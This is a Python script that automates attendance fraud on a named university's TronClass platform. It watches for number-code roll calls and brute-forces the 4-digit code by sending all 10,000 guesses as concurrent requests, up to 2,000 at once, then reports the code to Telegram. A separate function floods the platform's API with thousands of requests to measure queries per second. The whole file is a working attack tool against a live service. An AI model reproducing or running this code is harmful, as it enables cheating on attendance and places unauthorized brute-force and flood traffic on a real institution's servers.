import aiohttp
import yaml
import asyncio
import time
import re
import json
import random
import string 
from datetime import datetime
from pathlib import Path
from sys import exit
from tqdm import tqdm
from tqdm.asyncio import tqdm_asyncio
from http.cookies import SimpleCookie

TRON = 'https://tronclass.ntou.edu.tw'
PATH = Path('log')
PATTERN = re.compile(r'(LT[^"]+)')
with open(Path(__file__).parent.parent / 'config.yaml', 'r', encoding='utf-8') as file:
    CONFIG = yaml.safe_load(file)

class LoginFaild(Exception):
    def __init__(self, message='Login failed!'):
        super().__init__(message)

def random_id() -> str:
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=16))

def log(path:Path, resp:tuple[str, int, dict], cnt:int = -1) -> bool:
    if not CONFIG['config']['enable_log']:
        return False

    try:
        data = {
            'request': resp[0],
            'status_code': resp[1],
            'body': resp[2]
        }
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, 'a', encoding='utf-8') as file:
            file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {cnt}\n")
            file.write(json.dumps(data, ensure_ascii=False, indent=2))
            file.write('\n') 
    except Exception as e:
        print(e)
        return False
    return True

async def tg(text:str = 'test message'):
    if not CONFIG['notifications']['tg']['enable']:
        return
        
    async with aiohttp.request(
        method= 'POST',
        url=f"https://api.telegram.org/{CONFIG['notifications']['tg']['key']}/sendMessage",
        data = {
            'chat_id': f"{CONFIG['notifications']['tg']['chat']}",
            'text': text
        }
    ) as resp:
       pass 
    return

    

async def login(id:int = 0) -> SimpleCookie:
    for attempt in range(CONFIG['config']['retries']):
        try:
            async with aiohttp.ClientSession() as session:
                session.headers.update({'User-Agent': CONFIG['config']['user-agent']})

                async with session.get(url=f'{TRON}/login?next=/user/index') as page:
                    lt = PATTERN.search(await page.text()).group(0)
                data = {
                    'username': CONFIG['account']['user'],
                    'password': CONFIG['account']['passwd'],
                    'lt': lt,
                    'execution': 'e1s1',
                    '_eventId': 'submit',
                    'submit': '登錄'
                }

                async with session.post(url=page.url, data=data) as resp:
                    if 'forget-password' in await resp.text():
                        raise LoginFaild()
                    cookie = resp.cookies 
            return cookie

        except LoginFaild as e:
            if attempt < CONFIG['config']['retries']:
                print(f'login {id} | retry attempt {attempt}')
            else:
                print('Max retries reached! login failed')
                print('username or password may be incorrect\n' \
                'check password!\n')
                return None
        except Exception as e:
            print(f'login {id} | {e}')
            return None


# api endpoint ===================================================================================
async def re_visited() -> aiohttp.ClientResponse:
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        resp = await session.get(f'{TRON}/api/user/recently-visited-courses')
        return resp

async def number(rcid: int):
    succeed = 0
    semaphore = asyncio.Semaphore(2000)
    device = random_id()
    code = 'NA'
    tmp_log = []

    async def inner(try_code, session):
        nonlocal succeed, code
        async with semaphore:
            for _ in range(10):
                try:
                    async with session.put(
                        f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
                        json={
                            'deviceId': device,
                            'numberCode': f'{try_code:04d}'
                        },
                    ) as resp:
                        if resp.status == 200:
                            code = f'{try_code:04d}'
                            print(code)
                        elif resp.status == 400:
                            pass

                        tmp_log.append({
                            'data': (
                                str(resp.url),
                                resp.status,
                                await resp.json()
                            ),
                            'id': try_code
                        })

                        succeed += 1
                except Exception as e:
                    tmp_log.append({
                            'data': (
                                str(resp.url),
                                resp.status,
                                str(e)
                            ),
                            'id': try_code
                        })
                    await asyncio.sleep(5)
                break
        return

    timediff = time.perf_counter()
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        tasks = [inner(i, session) for i in range(10000)]
        await tqdm_asyncio.gather(*tasks, desc=f'brute-forcing with {rcid}')
    timediff = time.perf_counter()-timediff

    path = PATH/'num'/f'{rcid}.log'
    for i in tqdm(tmp_log, desc='saving log file'):
        log(path, i['data'], i['id'])
    log(path, (
        'summary',
        'code',
        dict(
            spend_time = timediff,
            succeed_cnt = succeed,
        )
    ))

    text = (
        f'Total time: {timediff}\n'
        f'Total request: {succeed}/{10000}\n'
        f'Code: {code}\n'
    )
    print(text)
    await tg(text)
    return

async def check_rollcall(cnt:int = -1) -> int:
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        async with session.get(f'{TRON}/api/radar/rollcalls?api_version=1.1.0') as resp:
            json: dict = await resp.json(encoding='utf-8')
            today = datetime.now()
            y = str(today.year)
            m = str(today.month)
            d = str(today.day)
            log(PATH/y/m/f'{d}.log', (str(resp.url), resp.status, json), cnt)

            if json.get('rollcalls'):
                rollcall: dict = json['rollcalls'][0]
                if rollcall.get('status') == 'on_call_fine':
                    print('rollcalled')
                    status = 0

                elif rollcall.get('is_number'):
                    id = rollcall.get('rollcall_id')
                    text = f'start num\n  id:{id}'
                    print(text)
                    await tg(text)
                    await number(id)
                    status = 1

                elif rollcall.get('is_radar'):
                    print('start loc')
                    status = 2
                else:
                    print('maybe qrcode')
                    status = 3
            else:
                print('not call')        
                status = -1
        return status



#  check env ===========================================================
async def checklogin():
    async with aiohttp.ClientSession(headers={
        'User-Agent': CONFIG['config']['user-agent']
    }) as session:
        async with session.get(url=f'{TRON}/login?next=/user/index') as page:
            lt = PATTERN.search(await page.text()).group(0)
        
        try:
            async with session.post(url=page.url, data={
                'username': CONFIG['account']['user'],
                'password': CONFIG['account']['passwd'],
                'lt': lt,
                'execution': 'e1s1',
                '_eventId': 'submit',
                'submit': '登錄'
            }) as resp:
                if 'forget-password' in await resp.text():
                    raise LoginFaild()
                ua = resp.request_info.headers.get('User-Agent')

            async with session.get('https://api.ipify.org') as resp:
                ip = await resp.text()

        except LoginFaild as e:
            s = 'username or password may be incorrect\n' \
            'check password!'
            print(s)
            exit()
        except Exception as e:
            print(e)

    text = (
        f'{ua}  \n'
        f'login succeed\nuser: {CONFIG["account"]["user"]}  \n'
        f'ip: {ip}'
    )
    print(text)
    await tg(text)
    return

async def qps(count:int = 10000):
    semaphore = asyncio.Semaphore(2000)
    path = PATH/'qps'/f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.log'
    succeed = 0
    tmp_log = []
                
    async def inner(id):
        nonlocal succeed, tmp_log
        async with semaphore:
            for _ in range(5):
                try:
                    async with session.get(
                        f'{TRON}/api/user/recently-visited-courses',
                    ) as resp:
                        data = (
                            str(resp.url),
                            resp.status,
                            await resp.text()
                        )
                        tmp_log.append({
                            'data': data,
                            'id': id
                        })
                        succeed += 1
                except Exception as e:
                    print(e)
                break
        return

    timediff = time.perf_counter()
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        tasks = [inner(i) for i in range(count)]
        await tqdm_asyncio.gather(*tasks, desc='testing queries per second')
    timediff = time.perf_counter()-timediff

    for i in tqdm(tmp_log, desc='saving log file'):
        log(path, i['data'], i['id'])

    text = (
        f'Total time: {timediff}  \n'
        f'Total request: {succeed}/{count}  \n'
        f'Success rates: {(succeed/count):.2%}  \n'
        f'QPS: {(count/timediff)}  \n'
        f'file locatoin: {path}  \n'
    )
    print(text)
    await tg(text)
    return

async def qps_num(id:int = -1):
    await number(id)
    return

async def main():
    await checklogin()
    for _ in range(CONFIG['config']['retries']):
        try: 
            cnt = 0
            while True:
                print(cnt, end=' ')
                await check_rollcall(cnt)
                cnt = cnt + 1
                await asyncio.sleep(CONFIG['config']['Senkaku'])
        except Exception as e:
            text = f'fatal error: retry {_} time\n  ' + str(e)
            time.sleep(10)
            print(text)
            await tg(text)


if __name__ == "__main__":
    # asyncio.run(qps())
    asyncio.run(qps_num())
    asyncio.run(main())
